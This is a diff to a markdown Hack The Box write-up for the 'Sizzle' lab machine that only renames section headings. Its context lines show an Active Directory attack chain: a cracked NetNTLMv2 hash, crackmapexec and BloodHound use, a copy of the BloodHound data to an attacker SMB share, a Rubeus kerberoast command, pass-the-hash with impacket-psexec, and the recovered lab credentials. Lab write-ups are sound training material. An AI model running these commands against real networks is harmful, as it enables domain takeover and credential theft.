@@ -3,7 +3,7 @@
 10.10.10.103 sizzle.htb.local sizzle.htb htb.local
 ```
 
-# Content
+### Content
 
 - Parsing NMAP output
 - FTP Enumeration (no files)
@@ -20,7 +20,7 @@
 - DCSync Attack (secretsdump.py)
 - PassTheHash (wmiexec.py & psexec)
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -454,7 +454,7 @@ Dictionary cache hit:
 
 AMANDA::HTB:aaaaaaaaaaaaaaaa:7fac1cf575b106f729106442743f4137:010100000000000000347f518833d901cb29f904b7bdd5a800000000010010006900555004d0059004b007a005000490003001000690055004d0059004b007a00500049000200100047004100690072005300730078006f0004001000470041006900720053300730078006f000700080000347f518833d90106000400020000000800300030000000000000000100000000200000c3e9d2d43adc1d14baf67b8123f7a2fb95d7977a9d1c9e7489c4f47ff657f2e810a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034400000000000000000000000000:Ashare1972
 ```
-# Exploitation
+### Exploitation
 We can check if this user has permissions with crackmapexec, since we receive the "[+]" sign meaning that credentials are correct:
 ```bash
 crackmapexec smb 10.10.10.103 --shares -u 'amanda' -p 'Ashare1972'
@@ -706,7 +706,7 @@ copy 20230129062023_BloodHound.zip \\10.10.14.4\shareFolder\bh.zip
 We can identify in Bloodhound that user mrlky is vulnerable to DCSync Attack:
 ![[Pasted image 20230129061433.png]]
 
-# Root privesc
+### Privilege Escalation
 Now to extract the hash NTLM from user mrlky we can abuse of Rubeus to execute a Kerberoasting attack with the following command:
 ```bash
 .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
@@ -755,14 +755,14 @@ Or use the psexec utility: ^a477a8
 ```bash
 impacket-psexec htb.local/Administrator:@10.10.10.103 -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267
 ```
-# Credentials
+### Credentials
 ```bash
 amanda:Ashare1972
 mrlky:Football#7
 administrator => aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267
 ```
 
-# Resources:
+### References
 
 * [NMAP Parser](https://github.com/honze-net/nmap-bootstrap-xsl) 
 * [RPCEnum](https://github.com/s4vitar/rpcenum)
